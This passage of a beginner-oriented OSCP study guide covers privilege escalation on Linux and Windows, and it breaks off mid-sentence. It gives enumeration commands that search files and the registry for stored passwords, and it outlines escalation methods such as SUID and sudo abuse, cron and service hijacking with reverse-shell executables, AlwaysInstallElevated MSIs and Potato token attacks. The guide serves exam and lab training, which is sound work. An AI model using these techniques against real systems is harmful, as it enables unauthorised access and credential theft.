# OSCP Privilege Escalation Guide (Beginner-Friendly)

## Introduction

Privilege escalation is the process of gaining higher-level access on a
target system after an initial foothold. In the context of OSCP, this
means elevating from a limited user (e.g. `www-data` on Linux or
`IIS_IUSRS` on Windows) to root or
Administrator[\[1\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Privilege%20escalation%20is%20the%20process,Linux%20or%20Administrator%2FSYSTEM%20on%20Windows).
This guide provides a step-by-step methodology for privilege escalation
using **Kali Linux** as the attacking machine and **Windows/Linux** as
targets. We will cover initial enumeration, systematic checks for common
misconfigurations, decision-making workflows, exploitation examples
(with commands and explanations), and post-exploitation cleanup. The
goal is to help OSCP students practice and quickly identify potential
privilege escalation paths during exams and labs, while understanding
*why* each step is taken.

**Methodology Overview:** The process is divided into phases for
clarity. Start with broad **enumeration** to gather system info and
obvious misconfigurations. Next, perform **categorized checks** of
common privilege escalation vectors (SUID files, sudo rights, Windows
services, registry, etc.). Use **decision trees** to pivot between
techniques based on findings (e.g. if one path fails, try the next). For
each finding, specific **exploitation commands** are provided with 2--3
line explanations. Finally, some **post-exploitation tips** and a
**checklist** are included to ensure nothing is missed. Throughout, we
prioritize clarity and OSCP exam alignment -- focusing on manual
techniques and well-known OSCP vectors, and using automated tools *only*
to assist enumeration (e.g. LinPEAS/winPEAS) while avoiding fully
automated exploits.

**Note:** Always maintain a clear, methodical approach: **enumerate
first, exploit
second[\[2\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Save%20time%20by%20running%20automated,tools%20while%20doing%20manual%20enumeration)**.
Collect as much info as possible, then choose an escalation path. If one
path is a dead end, go back to enumeration or try the next category.
Keep track of commands run and results (for exam report). Now, let\'s
begin with the first phase.

## Phase 1: Initial Enumeration

After gaining a low-privilege shell on a target, immediately gather
basic system and user information. This initial 10--15 minutes of
enumeration is
crucial[\[3\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Initial%20Enumeration%20%28First%2015%20minutes%29,Review%20network%20configuration):

### Linux Initial Enumeration

-   **Identify the current user and environment:**

```{=html}
<!-- -->
```
-   whoami && id            # Current username and UID/GID groups
        hostname && pwd         # Hostname and current working directory
        echo $SHELL, $PATH      # Default shell and PATH environment variable

    *Why:* Knowing your user, groups, and environment helps determine
    what you might be allowed to do. For example, belonging to special
    groups (docker, lxd, adm, sudo, etc.) can hint at escalation vectors
    (like `docker` group access or sudo rights).

```{=html}
<!-- -->
```
-   **Gather system information:**

```{=html}
<!-- -->
```
-   uname -a                # Kernel name, version, architecture[4]
        cat /etc/issue          # OS distribution/version (sometimes /etc/os-release)  

    *Why:* The OS and kernel version can reveal if the system is
    outdated or has known kernel vulnerabilities. Also, certain priv-esc
    exploits are OS-specific (e.g. Debian vs. CentOS differences).

```{=html}
<!-- -->
```
-   **Check for obvious privileges:**

```{=html}
<!-- -->
```
-   sudo -l                 # List allowed sudo commands (if any)[5]

    If it asks for a password, try pressing \<kbd\>Ctrl+D\</kbd\> or
    entering the current user\'s password (if known from initial
    foothold).\
    *Why:* Sudo privileges can be the *quickest win*. If `sudo -l` shows
    any command that can be run as root without a password (or with a
    known password), you can likely exploit that directly. We\'ll cover
    specific sudo exploits later.

```{=html}
<!-- -->
```
-   **Processes and network (quick look):**

```{=html}
<!-- -->
```
-   ps -ef | head -20       # Check running processes (are any unusual or running as root?)
        netstat -tunlp          # Listening ports (services that might be running with elevated rights)

    *Why:* Sometimes running processes or services might be
    misconfigured (e.g., a root-run process executing files in a temp
    directory). This also gives context about the machine\'s role.

```{=html}
<!-- -->
```
-   **User home and config files:**\
    List home directories and important config files:

```{=html}
<!-- -->
```
-   ls -la /home            # List users' home dirs
        ls -la /root            # Can we access root's home? (usually no)
        ls -la /tmp             # World-writable directory, any interesting files?

    If you have access, check common config locations for credentials:
    e.g., `/var/www`, configuration files in `/etc` (like DB configs),
    or user dotfiles (like `.bash_history`, `.ssh/authorized_keys`).
    *Stolen credentials* can often lead to privilege escalation (for
    instance, finding the root password in a script or config file, then
    using `su` or `ssh` as root).

> **Tip:** Consider running an **automated enumeration script** (such as
> *LinPEAS*) in the background for a thorough sweep, while you manually
> check the above basics. This can save time by highlighting potential
> issues (LinPEAS color-codes likely privesc vectors in
> red/yellow)[\[6\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Automated%20enumeration%20tools%20significantly%20speed,up%20the%20privilege%20escalation%20process)[\[7\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Interpreting%20LinPEAS%20Output).
> Just be mindful of noisy output and avoid fully trusting automation --
> use it to guide your manual investigation.

### Windows Initial Enumeration

-   **Identify current user and privileges:**

```{=html}
<!-- -->
```
-   whoami /all             &REM Shows username, groups, privileges[8]
        systeminfo              &REM OS version, patches, architecture[8]

    *Why:* `whoami /all` displays not only the user but also group
    memberships and *enabled*
    privileges[\[8\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows,User%20group%20memberships).
    For example, if you see **SeImpersonatePrivilege** or
    **SeBackupPrivilege** in the privileges list, note it -- those can
    be abused (explained later). `systeminfo` reveals OS version/build;
    if it\'s outdated (unpatched Windows 7/10, etc.), there may be known
    kernel exploits.

```{=html}
<!-- -->
```
-   **Check environment and basic info:**

```{=html}
<!-- -->
```
-   echo %COMPUTERNAME% %USERNAME%
        wmic os get caption, version, architecture

    *Why:* Confirms system name, domain/workgroup, and architecture (x86
    vs x64). Some exploits are architecture-specific, and domain
    membership could introduce Active Directory vectors (but OSCP
    standalone machines are usually not domain-joined unless it\'s an AD
    set, which is separate).

```{=html}
<!-- -->
```
-   **List running processes and services:**

```{=html}
<!-- -->
```
-   tasklist /v | findstr "Service"
        wmic service list brief | find "Running"

    *Why:* Identify high-privilege processes (especially those running
    as `SYSTEM`) that might be exploitable. For instance, a custom
    service running as SYSTEM could have misconfigurations.

```{=html}
<!-- -->
```
-   **Check for local administrator rights:**

```{=html}
<!-- -->
```
-   net localgroup administrators

    If the current user is listed in the Administrators group, you
    technically have admin-level access. However, on modern Windows, you
    might still be running in a medium-integrity process (due to UAC).
    Being in Administrators means you can attempt certain tricks like
    **UAC bypass** or use **schtasks** or **at** to get SYSTEM. (In OSCP
    exam, Administrator-level access usually counts as "privilege
    escalation" even if not SYSTEM, but it's good practice to try for
    SYSTEM when possible.)

```{=html}
<!-- -->
```
-   **Simple system checks:**

```{=html}
<!-- -->
```
-   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

    This checks if UAC is enabled (`EnableLUA`); if UAC is disabled
    (value `0`), a member of Administrators can directly do privileged
    actions without prompts. Also, if you suspect the machine is 32-bit,
    verify with `echo %PROCESSOR_ARCHITECTURE%`. Architecture matters
    for which exploits or tools (32-bit vs 64-bit) to use.

```{=html}
<!-- -->
```
-   **Automated enumeration (optional):** If you can transfer tools,
    consider using **WinPEAS** (a binary or PowerShell script) to gather
    a comprehensive report of
    misconfigurations[\[9\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=WinPEAS%20is%20the%20Windows%20counterpart,to%20LinPEAS)[\[10\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=1,patches%2C%20architecture).
    Also, **PowerUp** (`PowerUp.ps1`) or **Seatbelt.exe** can audit
    common privilege escalation issues (unquoted paths, vulnerable
    services, registry permissions,
    etc.)[\[11\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=PowerUp%20%28PowerShell%29%3Ca%3E%3C%2Fa%3E%20Import).
    Use these to supplement your manual enumeration if time permits.

> **Note:** On Windows, some enumeration might be constrained by lacking
> GUI or certain commands. You can use `powershell -c "<Command>"` for
> advanced queries if regular commands are limited. Always ensure any
> scripts or EXE you use are allowed by the target (AV can interfere,
> but OSCP lab machines often have no AV).

At the end of Phase 1, you should have a good understanding of: - Who
you are on the system and what privileges you *might* have. - The OS
type and version (to consider known exploits). - Quick hints of
misconfigurations (e.g. a sudo permission on Linux, or an interesting
privilege on Windows). - Running services or tasks that might be
vectors.

Now, with this baseline info, proceed to systematically check specific
categories of privilege escalation vectors.

## Phase 2: Categorized Privilege Escalation Checks

In this phase, dig deeper into specific areas. We organize checks by
category (Linux and Windows each) to ensure you don\'t miss common
vectors. Think of this as a **checklist of potential weaknesses**. Many
of these are \"quick wins\" that can be discovered in the first 30
minutes[\[12\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Quick%20Wins%20Check%20,Check%20for%20common%20credentials%20files).
For each category, we\'ll list what to check and why.

### Linux PrivEsc Enumeration (Key Categories)

1.  **SUID/SGID Files:**\
    SUID (Set-User-ID) binaries run with the privileges of their owner
    (often root) *regardless* of who executes
    them[\[13\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SUID%20,regardless%20of%20who%20executes%20them).
    This means if you find a world-executable file owned by root with
    the SUID bit set (`-rwsr-xr-x`), running it might perform some
    action as root. Similarly, SGID affects group privileges.\
    **Check for SUID/SGID files:**

-   find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null   # SUID files[13]
        find / -perm -2000 -type f -exec ls -l {} \; 2>/dev/null   # SGID files[13]

    Focus on unusual binaries not normally SUID, or which you recognize
    as potentially vulnerable. Common ones to note: `nmap`, `vim`,
    `less`, `find`, `perl`, etc., when they have SUID. Many are intended
    (e.g. `passwd` or `sudo` themselves), but some custom or uncommon
    SUID files could be your ticket. We will cover how to exploit such
    files in the next phase. *(Resource: GTFOBins is a great reference
    for exploiting various SUID
    binaries[\[14\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=4.%20PEASS,and%20WinPEAS%20source%20and%20documentation).)*

2.  **Sudo Permissions:**\
    If you didn\'t already, run `sudo -l` to list allowed sudo commands.
    Sometimes users are allowed to run specific commands as root (with
    or without password). Even seemingly harmless commands can often be
    abused to get a root shell due to poor restrictions.\
    **Check**: Look for lines like
    `User <you> may run the following commands...` If no password is
    required (`NOPASSWD:`) or if you have the password, note which
    commands are allowed. For each allowed command, consider if it can
    be leveraged. For example, editors (`vim`, `nano`), archive tools
    (`tar`, `zip`), or others might allow spawning a shell. We will see
    examples (tar wildcard, less, etc.) in the exploitation section.\
    *Also check environment preservation:* If `sudo -l` shows the
    `(!secure_path)` or `env_keep` or permits use of `sudo -E`, it may
    allow you to influence the execution environment (for instance,
    using `LD_PRELOAD`). This is an advanced vector where you preload a
    malicious library to get a shell.

3.  **Cron Jobs (Scheduled Tasks on Linux):**\
    Linux cron jobs running as root can be a goldmine if misconfigured.
    Check system-wide crons and user crons:

-   cat /etc/crontab                # System cron table (which tasks run as which users)[15]
        ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.d    # Script directories
        crontab -l                     # Cron jobs for current user (if any)

    Look for any cron job that is executed by **root** (or another
    privileged user) and references a file or script that you can edit.
    For example, a root cron running a script in `/tmp` or in a
    world-writable directory is a major find. Also check cron job file
    permissions: even if a cron job runs as root, if you can edit that
    file (e.g. a script in `/etc/cron.d/`), you can inject commands.
    Note any writable paths or suspicious scheduled tasks.

4.  **File/Directory Permissions & Ownership:**\
    Beyond SUID, look for important files that have *world-writable*
    permissions or are owned by your user. Some examples:

5.  Sensitive files like `/etc/passwd`, `/etc/shadow`, or config files
    in `/etc` that are writable (rare, but if found, immediate escalate:
    e.g. write a new root user into `/etc/passwd`).

6.  Home directories of other users or root that are world-accessible
    (e.g. if you can read `~root/.ssh/id_rsa` you could use it).

7.  Important executables or scripts that run as root but reside in
    writeable locations (for instance, a service executing a script from
    `/usr/local/bin` that is globally writable). Use commands like
    `find / -writable -type f -maxdepth 3 2>/dev/null` to spot
    world-writable files (be cautious, can be a lot of output).

8.  **Linux Capabilities:**\
    Linux capabilities allow splitting of root privileges among
    processes/files. Some binaries may have capabilities set (seen via
    `getcap`). For example, a binary with `cap_setuid+ep` can set UID to
    0 (root) even if not
    SUID[\[16\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Linux%20capabilities%20divide%20root%20privileges,into%20smaller%20units).\
    **Check capabilities:**

-   getcap -r / 2>/dev/null         # Recursively list file capabilities[17]

    Review output for capabilities like `cap_setuid`, `cap_setgid`,
    `cap_dac_read_search`, or `cap_dac_override`. For instance, if
    `python3` has `cap_setuid+ep`, it means any user can use that python
    binary to escalate privileges by calling `os.setuid(0)` in a
    script[\[18\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Common%20dangerous%20capabilities%3A%3Ca%3E%3C%2Fa%3E%20cap_setuid%20,a).
    We'll demonstrate this exploit later.

9.  **Network Services / NFS Shares:**\
    If the target has network services or exported file shares, they
    might be misconfigured for local escalation. A common scenario in
    OSCP labs is *NFS root squashing* issues. If `/etc/exports` (NFS
    export list) reveals a share with `no_root_squash`, and you can
    write to it, you could create an executable on the share that
    retains root privileges.\
    **Check NFS:**

-   cat /etc/exports               # NFS exports (if any)[19]

    If you see an exported directory with options like `no_root_squash`,
    that means files you write to that export as root will actually be
    owned as root on the target. We'll see how to exploit this by
    mounting the share from Kali and adding a SUID
    file[\[20\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=On%20attacker%20machine,a).

Also, consider other network vectors: Is there a database or service
running with saved credentials? Sometimes local ports or sockets might
allow privilege escalation (e.g. an exposed Docker socket or a
misconfigured Redis listening locally as root).

1.  **Docker / LXC Group Access:**\
    If your Linux user is in the `docker` group, it can run containers,
    which effectively is root access on the
    host[\[21\]](https://medium.com/@kankojoseph/from-containers-to-host-privilege-escalation-techniques-in-docker-487fe2124b8e#:~:text=From%20Containers%20to%20Host%3A%20Privilege,to%20carry%20out%20your).
    Similarly, being in `lxd` (LXC) group on Ubuntu can allow privilege
    escalation.\
    **Check groups:**

-   id   # see group list for your user

    If you see `docker` (or `lxd`), you likely have a path: Docker/LXC
    allows mounting the host filesystem or spawning privileged
    containers. For example, with Docker, a simple command can give a
    root shell on the host (demonstrated in exploitation phase). This is
    because Docker by design grants root-equivalent rights to its group
    members.

2.  **Kernel Version & Exploitability:**\
    If all else fails, consider a kernel exploit. Check `uname -r`
    (kernel release) and distribution
    version[\[22\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Kernel%20exploits%20target%20vulnerabilities%20in,the%20Linux%20kernel%20itself).
    Then use **searchsploit** or a Linux exploit suggester script to
    find potential local exploits. For instance, older kernels might be
    vulnerable to Dirty COW
    (CVE-2016-5195)[\[23\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Dirty%20COW%20%28CVE),
    Dirty Pipe (CVE-2022-0847), etc.\
    **Check kernel and compile tools:**

-   uname -r && lsb_release -a          # Kernel and OS version[22]
        which gcc || which cc              # Is a compiler available?

    On OSCP, some machines deliberately require using a public exploit
    (which you might compile on the target). If you find an exploit,
    ensure it matches the kernel exactly and test in a safe way if
    possible. We\'ll mention a couple in the exploitation section (e.g.,
    Dirty COW).

3.  **Miscellaneous Checks:**

4.  **PATH abuse:** If you found any cron jobs or scripts running as
    root, check if they call other programs without full path. If you
    can manipulate the `PATH` or put a malicious executable in a
    location that gets picked up first, you can hijack the execution.
    For example, a cron job that runs `backup.sh` might call `tar`
    without specifying `/bin/tar`. If `PATH` is misordered and you can
    place a fake `tar` in a directory that comes first, you get code
    execution as root. This is a bit situational; look out for
    world-writable directories in root\'s PATH.

5.  **Scheduled tasks (at, systemd timers):** While cron is common, also
    see if any `at` jobs are scheduled (`atq` command) or if any unusual
    systemd timers are present (check `/etc/systemd/system/` for user
    timers that might run as root).

6.  **Credentials in Memory**: Advanced, but if you have `ps` output,
    sometimes passwords appear in process arguments (e.g. a process
    running with `--password=...`). It\'s rare but worth a glance over
    `ps aux` output for any sensitive info.

Keep a structured checklist of these categories. If one vector seems
promising, you might jump ahead to exploiting it. Otherwise, enumerate
everything; often you\'ll find multiple potential paths and can choose
the easiest/most reliable.

### Windows PrivEsc Enumeration (Key Categories)

1.  **Privilege Tokens (Enabled Privileges):**\
    Windows uses privilege tokens, and some accounts have special rights
    that can be abused. We already used `whoami /priv` as part of
    initial enum. Focus on privileges like:

2.  **SeImpersonatePrivilege** (Impersonate a client after auth) -- very
    common in CTF/OSCP. If you have this, you can likely use token
    impersonation attacks (like **JuicyPotato** or **PrintSpoofer**) to
    get
    SYSTEM[\[24\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows%20tokens%20represent%20security%20context,and%20can%20sometimes%20be%20impersonated).

3.  **SeBackupPrivilege** (Backup files) -- allows reading any file
    regardless of permissions (we can use it to steal SAM/SYSTEM
    hives)[\[25\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SeBackupPrivilege%3A).

4.  **SeLoadDriverPrivilege** -- can load a malicious driver (rare in
    OSCP).

5.  **SeDebugPrivilege** -- can attach a debugger to SYSTEM processes
    (often only available to Administrators, so if you see this you
    might already be admin).\
    If any of the above are present *and enabled*, mark them for
    exploitation. (Often, `SeImpersonatePrivilege` is the big one in
    OSCP-style machines, due to how many exploits exist for it.)

6.  **Services and Service Configuration:**\
    Many Windows privilege escalation paths involve poorly configured
    services. Key things to check:

7.  **Unquoted Service Paths:** If a service path contains spaces and
    isn't quoted, and any directory in the path is writable, a low-priv
    user can plant an EXE that will execute as SYSTEM on service start.
    For example, a service with path
    `C:\Program Files\Unquoted Path Service\Common Files\service.exe`
    (not enclosed in quotes) is vulnerable. The system will try to
    execute:
    a.  `C:\Program.exe`
    b.  `C:\Program Files\Unquoted.exe`
    c.  `C:\Program Files\Unquoted Path.exe`
    d.  `C:\Program Files\Unquoted Path Service\Common.exe`
    e.  (Finally) the real service.exe.\
        If you can create `C:\Program.exe` (or any of those interim
        files) and the service is running as SYSTEM, you win.\
        **Check for unquoted paths:**

    -   wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"[26]

        This WMIC query lists auto-start services and filters out those
        in `C:\Windows`. Look for any paths with spaces and no quotes in
        the output. Alternatively, use `sc qc <ServiceName>` for each
        service to see its `BINARY_PATH_NAME`.

8.  **Weak Service Permissions:** A service might have an executable or
    configuration that is modifiable by normal users. For instance, if
    you can replace the binary of a service that runs as SYSTEM, you can
    restart the service to execute your payload. Tools like Sysinternals
    **AccessChk** are helpful here.\
    **Check service file permissions:** You can manually inspect with
    `icacls`. For example:

-   icacls "C:\path\to\service.exe"

    If it says `BUILTIN\Users:F` or similar for an executable, that
    means normal users have Full
    access[\[27\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=What%20we%20are%20interested%20in,rights).
    That's a critical find -- you could rename the original and put your
    own executable
    there[\[28\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=NT%20AUTHORITY)[\[29\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=We%20then%20compile%20it%20with,mingw%20like%20this).
    After replacing, restart the service:
        net stop <ServiceName> && net start <ServiceName>

    and your malicious exe will run as
    SYSTEM[\[30\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=Restart%20the%20Service).
    (We\'ll cover an example in the exploitation section.)

9.  **Service Registry Permissions:** Even if you cannot write the
    binary, check if you can modify the service configuration in
    registry. Each service has a registry key under
    `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`. If you have
    write access to that key (e.g. via some misconfigured permissions),
    you could change the `ImagePath` value to point to your own
    executable. This is another way to hijack a service. *Manual check:*
    use `reg query` to view the key and `accesschk.exe -k` to check
    permissions, or PowerUp\'s `Invoke-AllChecks` which flags modifiable
    services.

10. **AlwaysInstallElevated Policy:**\
    "AlwaysInstallElevated" is a Windows Installer policy that, if
    enabled for both user and machine, allows any `.msi` installer to be
    run with SYSTEM
    privileges[\[31\]](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/#:~:text=%28AlwaysInstallElevated%29%20www,be%20installed%20with%20administrative%20privileges).
    This is an easy-to-check setting and a *very* common OSCP exam
    vector.\
    **Check registry for AlwaysInstallElevated:**

-   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated[32]  
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated[32]

    If both queries return `0x1`, the policy is enabled for both Local
    Machine and Current User. That means you (as a normal user) can
    install an MSI package with system privileges. We'll exploit this by
    crafting a malicious MSI (for example, using `msfvenom` or
    `PowerShell` to add a new admin user or run a reverse shell) and
    executing it.

11. **Scheduled Tasks:**\
    Windows scheduled tasks can run with elevated privileges. Use
    `schtasks` to enumerate them:

-   schtasks /Query /FO LIST /V > tasks.txt

    Review `tasks.txt` for any tasks running as SYSTEM. Pay attention to
    the "Task To Run" or "Actions" -- does it execute a script or
    program, and can you modify that? If a scheduled task runs a .bat or
    .ps1 from a location you can write to, you can inject
    commands[\[33\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20task%20script%20is%20writable,C%3A%5Cpath%5Cto%5Ctask%5Cscript.bat).
    Also check if you have permissions to *modify* an existing task
    (though creating new tasks usually requires admin).\
    For example, if there\'s a daily task running
    `C:\scripts\backup.ps1` as SYSTEM, and `C:\scripts` is writable by
    you, you can edit `backup.ps1` to launch a
    shell[\[33\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20task%20script%20is%20writable,C%3A%5Cpath%5Cto%5Ctask%5Cscript.bat).
    Wait for the task to run (or if you can, manually run
    `schtasks /Run /TN <TaskName>`). This is analogous to cron jobs in
    Linux. Use `icacls` on the script path to verify if you can write.
    PowerUp also checks for this (it will list "vulnerable scheduled
    tasks").

12. **DLL Hijacking and PATH** (Missing DLLs or Search Order hijacks):\
    Some programs or services run by SYSTEM may try to load DLLs in an
    insecure way. Common issues:

13. **Missing DLL**: A service might attempt to load a DLL that doesn't
    exist, in a writable directory. If you identify such (using
    **Process Monitor** or the PowerUp script which suggests "Missing
    DLL" issues), you can place a malicious DLL there and restart the
    service[\[34\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Use%20Process%20Monitor%20to%20identify,AllChecks).
    The service will load your DLL as SYSTEM. Detecting this manually
    can be hard without tools, but one clue is an error in event logs or
    a known vulnerable software version (e.g. some software with known
    DLL hijack). In OSCP labs, this is less common without using tools.

14. **Writable directories in PATH**: If any directory in the system
    PATH environment is world-writable, and a high-priv process loads a
    DLL or runs an exe by name (not full path), you could drop a
    malicious file in that directory. This is also rare, but check PATH
    via `echo %PATH%` and then `icacls` on each listed directory. This
    vector often needs a trigger (like an admin logging in and running
    something) -- so consider it if other methods fail.

15. **Sensitive Information & Credentials:**\
    Sometimes the easiest path is not a "vulnerability" but a leaked
    credential. Search the system for passwords:

16. **Files**: Use `findstr` on Windows to search for common keywords in
    config files, e.g.:

-   findstr /SIM "password\|passwd\|Pwd" C:\Users\ %PROGRAMDATA% 2>NUL

    This searches for \"password\" case-insensitive through user
    directories and program data. Look for files like `unattended.xml`
    (might contain plaintext local admin creds), configuration files for
    apps (which might have DB passwords that double as system creds),
    etc.

17. **Registry**: Some registry keys store autologon passwords or other
    credentials. For example:

-   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

    If AutoAdminLogon is enabled, you might retrieve a plaintext
    password for a user. Also, GPP (Group Policy Preferences) passwords
    (if domain) might be found under `SYSVOL` shares (requires domain
    context). While AD is beyond scope for standalone OSCP machines,
    it\'s good to remember if you ever encounter domain scenarios.

18. **Browser or RDP creds**: If allowed, you might check for saved
    creds in browsers or RDP connection manager, though in exam setting
    this might be out-of-scope or time-consuming.

19. **Windows Kernel & Exploits:**\
    Similar to Linux, if the Windows version is old or unpatched, local
    exploit modules exist. Identify the OS version (from `systeminfo`)
    and see if it matches known exploits. E.g., Windows 7 SP1 without
    certain patches is vulnerable to **MS16-032** (Secondary Logon
    exploit) or **MS15-051** (ATMFD kernel driver exploit). Windows 10
    builds prior to 1803 had JuicyPotato working for SeImpersonate. Use
    a tool like **Sherlock** (PowerShell script) or **Windows Exploit
    Suggester** (which compares patches from systeminfo) to automate
    this search. If you find a likely exploit, ensure you have the
    correct exploit code and compile if needed. Keep this as a last
    resort on OSCP; usually at least one easier misconfiguration exists,
    but it\'s good to be prepared with a couple of go-to Windows kernel
    exploits.

By systematically checking these categories, you should uncover one or
more potential privilege escalation vectors on the target. Next, we
discuss how to decide which path to pursue and when to pivot to
alternatives.

## Phase 3: Decision Trees -- When to Pivot?

Privilege escalation often presents multiple options. It\'s important to
**prioritize the easiest and most reliable path**. Here\'s a breakdown
of decision-making for Linux and Windows:

### Linux Decision Path

1.  **Quick Wins First:** After initial enum, did `sudo -l` show any
    NOPASSWD entry or easy command? If yes, focus there first (sudo
    exploits are usually straightforward and don\'t require compiling
    code). For example, if you can run `sudo vim` or `sudo tar` as root,
    those have known escape sequences to get a shell (we\'ll exploit in
    next section). **Go for sudo-based privesc whenever possible** --
    it\'s typically the fastest way to root. If it works, you can stop
    searching further (but document the method for your report).

2.  **SUID/SGID binaries:** If no luck with sudo, and you found unusual
    SUID binaries, analyze them. Is it a known program (like `nmap`,
    `find`, `perl`, etc.)? If so, recall or research its GTFOBins
    technique[\[14\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=4.%20PEASS,and%20WinPEAS%20source%20and%20documentation).
    If it\'s a custom binary, maybe it can be exploited (sometimes CTFs
    have intentionally buggy SUID programs). Try the known ones first.
    *Pivot:* If one SUID exploit fails (maybe version not vulnerable),
    try others. If none of the SUID files seem exploitable or they
    don\'t work, move on.

3.  **Cron jobs / Scheduled tasks:** Did you find a writable cron script
    or job? If yes, that\'s a relatively easy win: you can plant a
    backdoor and wait for execution. Downside: timing (you might need to
    wait up to an hour for a hourly cron). If you have the patience or
    can trigger it sooner (sometimes by manually running the cron script
    if it\'s not restricted), this is very reliable. If cron is present
    but you're not sure how to exploit it, keep it in mind and keep
    enumerating.

4.  **File permissions & Credentials:** If the above haven\'t panned
    out, consider a more **thorough search for credentials or config
    leaks**. For instance, search the filesystem for strings like
    \"password=\" or \"PASS\" in config files:

-   grep -R "password" /home 2>/dev/null
        grep -R "password" /var/www 2>/dev/null
        grep -R "password" /etc 2>/dev/null

    If a web app or database config contains a password, test if that
    password works for `su root` or any other user account. Many times,
    developers reuse passwords. Also check if any user has `sudo` rights
    with a password (it may be that the user can sudo if you know their
    password -- which you might find in a script).

Similarly, check user bash history files (`~/.bash_history`) for clues
of root commands or passwords typed.

If you find creds and they work to become root (or a higher-privilege
user), that\'s a clean escalation without "exploiting" a flaw, so always
remain alert to this possibility.

1.  **Unusual Group Memberships:** If you are in a special group
    (docker, lxd, etc.), pivot to using that. For example, in the docker
    group, you might have ignored it initially, but it's essentially a
    free root if you exploit it. Same for lxd (with a known LXD image
    import technique). So don't forget to exploit group privileges if
    present -- they often require just a couple of commands.

2.  **Kernel Exploits (Last Resort):** Only after exhausting the above,
    consider compiling/running a kernel exploit. Why last? Because they
    can crash the target or make it unstable, and in an exam you risk
    losing your shell. If you suspect the machine was *intended* to be
    rooted via kernel exploit (usually if it's a very old OS and nothing
    else works), choose a known stable exploit. For instance, Dirty COW
    is stable for older kernels (but note it creates a new user). If
    using searchsploit, read about any caveats. Also, if you need to
    compile and there\'s no compiler, you might have to transfer a
    pre-compiled binary matching the system architecture.

**Pivoting:** Always be ready to pivot. For example, suppose you tried
to exploit a SUID binary but it didn't yield root. Don't get stuck ---
try something else (maybe the cron job vector). Conversely, if you
edited a cron script but it hasn't run yet, you could still explore
other paths in parallel (maybe run LinPEAS to see if you missed
something). In OSCP, time management is key, so have a *plan B, C,* etc.
if plan A fails or is slow.

**Example decision scenario:** You find `sudo -l` allows `tar` with no
password → you attempt the tar wildcard exploit. If it succeeds, great
(rooted!). If not, maybe the environment isn't right. Rather than
spending 30 minutes debugging it, check other findings: oh, there\'s
also a SUID `nmap` and it\'s an old version -- try that route with an
interactive shell. Always circle back if needed, but try the next vector
after a reasonable attempt.

### Windows Decision Path

1.  **Privileges and Quick Exploits:** If `SeImpersonatePrivilege` is
    present (and the OS is not extremely new where *JuicyPotato* might
    not work), this is often your fastest win. Use a Potato attack
    (JuicyPotato for Win7/2008/early Win10, or RoguePotato/PrintSpoofer
    for newer) to get SYSTEM. We'll show how in next section. If it
    fails (maybe the service needed for it isn't running, e.g.
    RPCSS/DCOM), then reassess other options. If `SeBackupPrivilege` is
    present, consider using it to read SAM and SYSTEM hives (then crack
    or pass the hash). That might take time though, so weigh it against
    others.

2.  **AlwaysInstallElevated:** If both reg settings were 1, this is
    extremely straightforward and reliable. Craft an MSI and run it --
    you'll get SYSTEM. There's little reason to hold this off; do it as
    soon as you confirm the settings. It's easier than messing with
    services. Only caveat: you need a way to create or bring in an MSI
    (msfvenom or `msbuild` can help). If you're not comfortable
    generating an MSI on the fly, you might quickly decide another path.
    But generally, AlwaysInstallElevated is a gift -- use it.

3.  **Service Misconfigurations:** If neither impersonation nor
    AlwaysInstallElevated apply, focus on services:

4.  Did `accesschk` or your enumeration find a service where you have
    write permission to its binary or config? If yes, prepare a
    replacement binary (a simple reverse shell EXE or an add-user exe)
    and swap it in, then restart the service. This tends to work well.
    Just be sure not to crash anything critical.

5.  Did you find an unquoted path vulnerability? If yes and you can
    create the required executable (and the service can be restarted),
    go for it. If you *cannot restart the service* (lack rights or fear
    of disrupting), you might hold this as a backup option or try
    triggering a system reboot (not usually possible in exam without
    losing points).

6.  If you found a service you can *create* (like you have admin group
    membership but not system), note that with admin you can typically
    just do other things to get system (like
    `schtasks /create /ru SYSTEM` etc.), so service creation is rarely
    needed.

7.  **Scheduled Tasks / Startup:** If a scheduled task is writable,
    that's a good path. You might need to wait for its schedule. Weigh
    this against available time. If only 30 minutes remain and the task
    runs every day at midnight, that's not useful -- better try another
